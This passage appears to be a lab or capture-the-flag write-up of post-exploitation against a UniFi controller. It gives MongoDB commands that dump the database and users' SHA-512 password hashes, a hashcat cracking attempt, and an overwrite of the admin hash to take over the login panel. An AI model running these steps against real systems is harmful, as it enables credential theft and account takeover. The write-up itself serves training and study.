
Utilized the following queries to enumerate MongoDB Databases.

```
mongo --port 27117 --eval "db.adminCommand('listDatabases')"
```

We'll utilize the following functions to enumerate admin credentials.

```
mongo --port 27117 ace --eval “db.admin.find().forEach(printjson);”
```

Dump the whole database:

```
mongo --port 27117 ace --eval "db.getCollectionNames().forEach(function(c) { print('=== ' + c + ' ==='); db[c].find().forEach(printjson); })"
```

This revealed encrypted credentials for many users:

```
administrator:$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.
```

```
michael:$6$spHwHYVF$mF/VQrMNGSau0IP7LjqQMfF5VjZBph6VUf4clW3SULqBjDNQwW.BlIqsafYbLWmKRhfWTiZLjhSP.D/M1h5yJ0
```

Let's save those credentials onto our local machine & try to decrypt the password. Bruteforcing an password was unsuccessful!

```
hashcat -m 1800 hash /usr/share/wordlists/rockyou.txt
```

Updated admin credentials to "Password1234".

```
mongo --port 27117 ace --eval 'db.admin.updateOne({"_id": ObjectId("61ce278f46e0fb0012d47ee4")}, { $set: { "x_shadow": "Password1234" } })'
```

Now because the original password is stored in a hashed SHA-512, we must rewrite it with the same format.

```
mkpasswd -m sha-512 Password1234
$6$UBC.G7B5S1jXFZf9$4Tbf/yz3/mTdi4DG5vqYESwyBNNB91pOqo0MjuKCpFNmYoc1KGZgPVsP2vZ6yxNF27sR5vxzKjnrRdr.jzyJ9/
```

Now rewrite the encoded original password aswell.

```
mongo --port 27117 ace --eval 'db.admin.updateOne({ "_id": ObjectId("61ce278f46e0fb0012d47ee4") }, { $set: { "x_shadow": "$6$UBC.G7B5S1jXFZf9$4Tbf/yz3/mTdi4DG5vqYESwyBNNB91pOqo0MjuKCpFNmYoc1KGZgPVsP2vZ6yxNF27sR5vxzKjnrRdr.jzyJ9/" } })'
```

Now we should be able to access the UniFi Login Panel.

Successfully logged into the UniFi Network!